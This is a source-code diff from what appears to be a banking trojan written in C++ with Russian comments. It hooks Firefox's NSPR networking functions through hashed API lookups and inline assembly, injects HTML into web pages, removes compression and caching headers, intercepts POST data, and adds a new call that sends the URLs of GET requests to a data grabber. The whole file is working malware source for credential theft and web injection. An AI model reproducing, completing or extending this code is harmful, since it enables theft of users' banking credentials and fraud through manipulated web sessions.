@@ -22,6 +22,7 @@
 #include "HTTPConsts.h"
 #include "BotClasses.h"
 #include "Firefox.h"
+#include "GETDataGrabber.h"
 
 #include "Modules.h"
 
@@ -173,7 +174,7 @@ void FFBG_Template(REQUEST Request, DATA Data, STR_ Str, ARG1 Arg, ARG2 Arg2)
 
 
 /* Описания констант */
-char HeaderContentLength[] = {'c','o','n','t','e','n','t','-','l','e','n','g','t','h',':',' ',0};
+//char HeaderContentLength[] = {'c','o','n','t','e','n','t','-','l','e','n','g','t','h',':',' ',0};
 
 
 typedef PRInt32 (*PWRITE)( PRFileDesc *fd,const void *buf,PRInt32 amount ); 
@@ -248,7 +249,7 @@ namespace FFUtils
 		// Функция обрабатывает загруженный заголовок
 
 		PMemBlock Block = MEMBLOCK::Pack(Request->ReceiveList);
-		if (Block == NULL || Block->Size == 0) return false;
+		if (Block == NULL || Block->Size == 0) return false; 
 
 		PCHAR Buf = (PCHAR)Block->Data;
 		// Определяем размер заголовка
@@ -344,11 +345,15 @@ namespace FFUtils
 }
 //----------------------------------------------------------------------------
 
+//int Count = 0;
+
 #ifdef FFInjects
 
 	bool InjectFF(PRequest Request)
 	{
 		// Обрабатываем загруженные данные
+
+		    
 		if (Request == NULL || !Request->IsInject)
 			return false;
 
@@ -356,17 +361,30 @@ namespace FFUtils
 
 		Request->Injected = true;
 
+		
+
 		THTTPSessionInfo Session; // Описание сессии
 
 		Session.BrowserType = BROWSER_TYPE_FF;
 		Session.UserAgent = FFUserAgent;
-		Session.URL = Request->URL;
+		Session.URL = Request->URL; 
 
-		Request->Injected = true;
+		// Временный код
+/*		Count++;  
+		string FN;  
+		FN.Format("c:\\Config\\HTML\\html_%d.txt", Count);
+		File::WriteBufferA(FN.t_str(), Request->Buffer, Request->BufferSize); */
+		//------------------------------------------------------------------------------
+		
 		if (HTMLInjects::Execute(Request, &Session))
 		{
 			FFUtils::UpdateResponseHeaders(Request);
 			FFDBG(Request, NULL, "+++++  В документ внесены изменения");
+
+/*			string FN;  
+			FN.Format("c:\\Config\\HTML_A\\html_%d.txt", Count);
+			File::WriteBufferA(FN.t_str(), Request->Buffer, Request->BufferSize); */
+
 			return true;
 		}
 
@@ -379,8 +397,7 @@ bool SubstituteHeader(PCHAR Buffer, PRInt32  &BufferSize)
 {
 	// Функция подменяет некоторые заголовки запроса
 
-	// Отключаем сжатие данных
-
+ 
 	int Pos = STR::Pos(Buffer, ParamAcceptEncoding, BufferSize, false);
 	if (Pos >= 0)
 	{
@@ -405,10 +422,12 @@ bool SubstituteHeader(PCHAR Buffer, PRInt32  &BufferSize)
 
 
 	// Удаляем дату модификации документа
+	//BufferSize = HTTPParser::DeleteHeader(ParamAcceptEncoding, Buffer, BufferSize);
 	BufferSize = HTTPParser::DeleteHeader(ParamIfModifiedSince, Buffer, BufferSize);
 	BufferSize = HTTPParser::DeleteHeader(ParamIfNoneMatch, Buffer, BufferSize);
 
-	return TRUE;
+
+	return true;
 }
 
 //----------------------------------------------------------------------------
@@ -509,7 +528,12 @@ bool MakeInfo( PRequest Request, PCHAR buf, int len )
 
         // В случае GET запроса прерываем обработку
 		if (Request->Method == hmGET)
+		{
+			#ifdef GETDataGrabberH
+				SendGETData(Request->URL, FFUserAgent, BROWSER_TYPE_FF);
+			#endif
 			return true;
+        }
 
 
 		// Подготавливаем запрос к перехвату пост данных
@@ -765,6 +789,7 @@ PRInt32 PR_ReadHook(PRFileDesc *fd, void* buf, PRInt32 amount )
 }
 //---------------------------------------------------------------------------
 
+
 PRInt32 PR_WriteHook(PRFileDesc *fd, const void* buf, PRInt32 amount )
 {
 	//  Метод отправки данных на сервер
@@ -784,8 +809,9 @@ PRInt32 PR_WriteHook(PRFileDesc *fd, const void* buf, PRInt32 amount )
 			FFDBG(Request, NULL, (PCHAR)buf);
 			FFDBG(Request, NULL, "\r\n\r\n");
 		#endif
+		
 
-
+  
 		if (MakeInfo(Request, (PCHAR)buf, (int)amount ) )
 		{
 
@@ -815,7 +841,7 @@ PRStatus PR_CloseHook(PRFileDesc *fd)
 {
 //	PRStatus Status = PR_CloseReal(fd);
 	DWORD Res = Request::Delete(FFRequests, fd);
-	if (Res != 0)
+	if (Res)
 	{
 		FFDBG(Res, NULL, "\r\n==============  Соединение закрыто \r\n");
 	}
@@ -909,6 +935,7 @@ bool HookMozillaFirefox()
 	WCHAR nspr4[] = {'n','s','p','r','4','.','d','l','l',0};
 	WCHAR ssl3[]  = {'s','s','l','3','.','d','l','l', 0 };
 
+
 	if (CheckInCurrentDir( nspr4 ) && CheckInCurrentDir( ssl3 ) )
 	{
 		//UnhookFF();
@@ -949,6 +976,7 @@ bool NSPRHOOKS::HookNSPRApi()
 	DWORD PR_ConnectHash   = 0xBF667EA2;
 	DWORD SSL_ImportFDHash = 0xA1C4E024;
 
+
 	if (HookApi( DLL_NSPR4, PR_OpenTCPSocketHash, &PR_OpenTCPSocketHook))
 	{
 	   __asm mov [PR_OpenTCPSocketReal], eax
@@ -983,7 +1011,7 @@ bool NSPRHOOKS::HookNSPRApi()
 		__asm mov [ PR_ReadReal ], eax
 	}
 	else
-		return false;
+		return false; 
 
 
 	#ifdef FFExtInjectsH
